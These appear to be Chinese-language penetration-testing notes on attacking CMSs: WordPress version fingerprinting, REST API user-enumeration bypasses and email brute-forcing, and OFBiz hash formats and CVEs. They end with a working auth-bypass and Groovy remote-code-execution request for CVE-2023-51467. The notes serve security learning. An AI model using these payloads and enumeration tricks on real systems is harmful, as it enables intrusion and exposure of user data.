# CMS通用攻击模式
## CMS确定版本
* 一般CMS都会有确定的版本，往往会在目录中，或者主页源码中包含，最多的是在源码中，往往版本号会以参数传给插件，多看看插件，可能会有收获。
* 但是，往往有些CMS安全性能高，会隐藏版本，没有登录权限，无法得知版本，这时可以查看界面或者CMS名字，得知大概的公布时间，使用google或者其他浏览器搜索公共漏洞exp



## [[被动信息收集#google hacking|google]]枚举CMS
* 得知具体版本：
  `allintext:"nagios xi 2.12" exploit`
* 未知具体版本：
  `allintext:CVE-2010..2023 "nagios xi`  其中2010..2023为年限为2010年到2023年所有nagios的CVE漏洞




# wordpress CMS
## wordpress基础
### （1）wordpress目录结构
`[文件夹] wp-admin`      管理员页面
`[文件夹] wp-includes`   
`[文件夹] wp-content`    包含主题，插件，上传文件，默认情况下，uploads是以年月的形式组织显示的
`.htaccess`
`robots.txt `           有时没有
`index.php`
`license.txt`
`readme.html`
`wp-config.php`         其中包含数据库连接数据（账号密码）
`wp-activate.php`
`wp-blog-header.php`
`wp-comments-post.php`
`wp-config-sample.php`
`wp-cron.php`
`wp-links-opml.php`
`wp-load.php`
`wp-login.php`
`wp-mail.php`
`wp-settings.php`
`wp-signup.php`
`wp-trackback.php`
`xmlrpc.php`
`[文件夹] wp-content`
包含：themes文件夹，plugins文件夹，uploads文件夹，index.php


## wordpress版本
### （1）HTML meta信息中含有wordpress版本
* `<meta name =“ generator” content =“ WordPress 3.5.2” />`
  README.html
  readme.html中含有wordpress版本，但是新版wordpress中将这种信息抹除了
### （2）网站HTML源中的版本
* 在HTML源代码中 ， 该版本通常作为参数添加到页面加载的链接javascript和css资源上 
  ```html
<link rel='stylesheet' id='wp-block-navigation-css' href='http://192.168.2.200:8000/wp-includes/blocks/navigation/style.min.css?ver=6.4' media='all' />
  ```
  显示wordpress版本为6.4



## wordpress用户枚举
### （1）使用[[Web API|API]]枚举用户
* rest_route API枚举
  `https://abc.com/blog/wp-json/wp/v2/users`   屏蔽
  `https://abc.com/blog/?rest_route=/wp/v2/users `  绕过
  获得wordpress用户列表，用户id为1的用户
* 使用wordpress公共API枚举用户
  例如jetpack插件会将用户列表数据导入到wordpress.com通过公共REST API提供
  `https://blog.*******.com/wp-json/wp/v2/users` 已屏蔽
  `https://public-api.wordpress.com/rest/v1.1/sites/blog.*******.com/posts `绕过
### （2）使用搜索枚举用户
* 在少数情况下，我们遇到了没有明确阻止的API，但/wp/v2/users端点没有返回avatar_urls属性。这是由第三方安全插件或手动禁用头像（设置>讨论>头像）造成的。
  设置，将在网页和REST响应中隐藏头像。
  我们也找到了一个解决这些问题的方法。该端点支持参数 "搜索"。它的值与所有用户的字段匹配，包括电子邮件地址。通过简单的自动化，有可能发现每个电子邮件地址。与匹配的电子邮件相关的用户信息将在JSON响应中返回。根据经验，我们可以估计，揭示一个电子邮件地址需要200到400个请求。
  `https://api.*****.com/wp-json/wp/v2/users`  已屏蔽
  `https://api.*****.com/wp-json/wp/v2/users?search=r@initech.com`
  `https://api.*****.com/wp-json/wp/v2/users?search=er@initech.com`
  `https://api.*****.com/wp-json/wp/v2/users?search=ter@initech.com`
  `https://api.*****.com/wp-json/wp/v2/users?search=eter@initech.com`
  `https://api.*****.com/wp-json/wp/v2/users?search=peter@initech.com`  绕过
  绕过
### （3）拼接绕过枚举用户
* 有时主句会拒绝列出所有用户信息，但是可以正对一个用户进行枚举
  `https://www.*****.org/wp-json/wp/v2/users`  已屏蔽
  `https://www.*****.org/wp-json/wp/v2/users/1`  绕过
* 大小写绕过枚举用户
  `https://blog.*****.com/section/news?rest_route=/wp/v2/users ` 已屏蔽
  `https://blog.*****.com/section/news?rest_route=/wp/v2/usErs`  绕过


  
## wordpress插件枚举


# Apache OFbiz CMS

## OFbiz基础
比较常见的CMS，使用J2EE/XML规范，在一些大型电商平台会使用，OFbiz提供了大量的开发工具以及完善的服务引擎，消息引擎，工作流引擎，规则引擎等。
### （1）OFbiz后台
* `/accounting/control/main`
* `/control/main`
  一般发现后台就会发现OFbiz的版本，一般在右下角
### （2）OFbiz密码策略
* OFBiz 默认采用 SHA 加密，并且给了随机长度的盐，在登录的时候，拿用户输入的密码加密后，和数据库的密文进行比对，密码有 2 中情况，一种是` {SHA}`开头的系统默认密码，一种是` $SHA$ `开头的用户修改密码
  `{SHA}`开头的密码，校验方法为，例如` {SHA}b21985b2b0ff043b88af6606ef46d19379e0d853`：
  （1）把用户输入的密码直接用 SHA 加密
  （2）把得到的 byte 字节数组转换成 16 进制
  （3）把得到的 16 进制支付串和数据库中的密文比对（不包含 {SHA}）
  `$SHA$`开头的密码，校验方法为，例如` $SHA$QTrjOV5Y0$JcuATekEKOYp6TSvM8jifQU3Q4Y`
  （1）这种密码，按 $ 符号分割，第一段是加密方式，第二段是 盐（salt），第三段是密文
  （2）按照第一种方法取到 salt，按照 用户输入的密码和 salt 用 SHA 加密获取到 byte 字节数组
  （3）然后将 byte 字节数组用 BASE64URL 安全的方式转换成字符串
  （4）把字符串和数据库密文对比


## OFbiz漏洞
### （1）CVE-2023-49070
* 这个漏洞利用了ofbiz中XMLRPC的反序列漏洞，可以远程执行代码，但是在18.12.10版本彻底修复了该漏洞
### （2）CVE-2023-51467
* 这个漏洞使用ofbiz中的工具webtools中的control输入用户名和密码，并且post输入groovyProgram，其中注入java语句，执行bash代码
```
POST /webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
groovyProgram=throw+new+Exception('id'.execute().text);
```
